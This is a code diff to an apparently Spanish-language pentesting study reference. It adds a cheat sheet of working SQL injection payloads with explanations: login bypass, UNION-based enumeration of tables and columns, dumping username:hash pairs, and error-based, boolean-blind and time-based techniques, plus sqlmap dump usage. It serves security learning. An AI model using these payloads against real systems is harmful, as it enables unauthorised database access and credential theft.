@@ -133,9 +133,89 @@ CONCEPTS = [
         ],
         "commands": [
             {
+                "cmd": "'",
+                "why": "Prueba de deteccion: una sola comilla rompe la sintaxis si el campo es inyectable.",
+                "out": "Un error de SQL o una pagina 500 = probable SQLi. Si no cambia nada, prueba comilla doble o la version numerica (sin comillas).",
+            },
+            {
+                "cmd": "' OR '1'='1",
+                "why": "Bypass de login clasico: cierra la cadena y fuerza una condicion siempre verdadera.",
+                "out": "Entras sin credenciales validas, o la busqueda devuelve todas las filas.",
+            },
+            {
+                "cmd": "' OR '1'='1'-- -",
+                "why": "Igual que el anterior pero comenta el resto de la consulta: '-- -' (con espacio final) ignora lo que sobra, util si queda una comilla suelta.",
+                "out": "Login aceptado; si antes fallaba por sintaxis, el comentario lo arregla.",
+            },
+            {
+                "cmd": "admin'-- -",
+                "why": "Entra como un usuario concreto (admin) comentando la comprobacion de la password.",
+                "out": "Sesion iniciada como admin sin saber su contrasena.",
+            },
+            {
+                "cmd": "\") OR (\"1\"=\"1",
+                "why": "Variante para consultas que envuelven el valor en comillas dobles y parentesis.",
+                "out": "Usala cuando la comilla simple no rompe la pagina pero la doble si.",
+            },
+            {
+                "cmd": "' ORDER BY 1-- -",
+                "why": "Averigua el numero de columnas: sube el numero (1, 2, 3...) hasta que la pagina falle.",
+                "out": "El ultimo numero que NO da error = numero de columnas. Hace falta para el UNION.",
+            },
+            {
+                "cmd": "' UNION SELECT NULL-- -",
+                "why": "Ajusta la lista de NULL al numero de columnas (anade ,NULL) hasta que la pagina cargue sin error.",
+                "out": "Cuando deja de dar error, el UNION funciona con ese numero de columnas.",
+            },
+            {
+                "cmd": "' UNION SELECT 1,2,3-- -",
+                "why": "Marca cada columna con un numero para ver cuales se reflejan en la pagina.",
+                "out": "Los numeros que aparecen en pantalla son las columnas donde puedes extraer datos.",
+            },
+            {
+                "cmd": "' UNION SELECT NULL,version(),NULL-- -",
+                "why": "Extrae la version del motor por una columna reflejada (ajusta la posicion a la que viste antes).",
+                "out": "La version de MySQL/MariaDB; te dice que sintaxis de enumeracion usar.",
+            },
+            {
+                "cmd": "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -",
+                "why": "Lista las tablas de la base desde el catalogo information_schema (MySQL/MSSQL/Postgres).",
+                "out": "Nombres de tablas; busca users, accounts, credentials o similar.",
+            },
+            {
+                "cmd": "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -",
+                "why": "Lista las columnas de una tabla concreta para saber que campos volcar.",
+                "out": "Nombres de columnas como username, password, email.",
+            },
+            {
+                "cmd": "' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users-- -",
+                "why": "Vuelca usuario y hash juntos, separados por ':' (0x3a es el codigo hex de los dos puntos), en una sola columna.",
+                "out": "Pares usuario:hash. Los hashes van a la fase de credenciales para crackear y reutilizar.",
+            },
+            {
+                "cmd": "' AND extractvalue(1,concat(0x7e,version()))-- -",
+                "why": "SQLi basada en error (MySQL): fuerza que el dato aparezca dentro del propio mensaje de error.",
+                "out": "Un error tipo 'XPATH syntax error: ~<dato>' que filtra la version u otro dato que pidas.",
+            },
+            {
+                "cmd": "' AND 1=1-- -",
+                "why": "Blind booleana (caso verdadero): la pagina responde normal. Comparalo con el caso 1=2.",
+                "out": "Respuesta identica a la normal = condicion verdadera. Es tu oraculo de 'si'.",
+            },
+            {
+                "cmd": "' AND 1=2-- -",
+                "why": "Blind booleana (caso falso): si la pagina cambia frente a 1=1, puedes inferir datos bit a bit.",
+                "out": "Respuesta distinta (menos contenido, sin resultados) = condicion falsa. Con 'si' y 'no' automatiza con sqlmap.",
+            },
+            {
+                "cmd": "' OR SLEEP(5)-- -",
+                "why": "Blind por tiempo (MySQL): cuando no hay reflejo ni cambio visible, mide el retardo de la respuesta.",
+                "out": "Si la respuesta tarda ~5s, es vulnerable. En MSSQL usa '; WAITFOR DELAY '0:0:5'-- -.",
+            },
+            {
                 "cmd": "sqlmap -u '$URL/item?id=1' --batch --dbs",
-                "why": "Cuando ya sospechas SQLi (una comilla rompio la pagina), sqlmap automatiza la deteccion y explotacion. --batch acepta los defaults; --dbs lista las bases de datos como primera prueba de que funciona.",
-                "out": "El tipo de inyeccion detectada (boolean, time-based, UNION) y la lista de bases de datos. Con eso, sigue con --tables y -D <db> --dump para extraer usuarios y hashes.",
+                "why": "Cuando ya confirmaste SQLi a mano, sqlmap automatiza la explotacion. --batch acepta los defaults; --dbs lista las bases de datos como primera prueba.",
+                "out": "El tipo de inyeccion (boolean, time-based, UNION) y la lista de bases. Sigue con --tables y -D <db> --dump para extraer usuarios y hashes.",
             },
         ],
     },
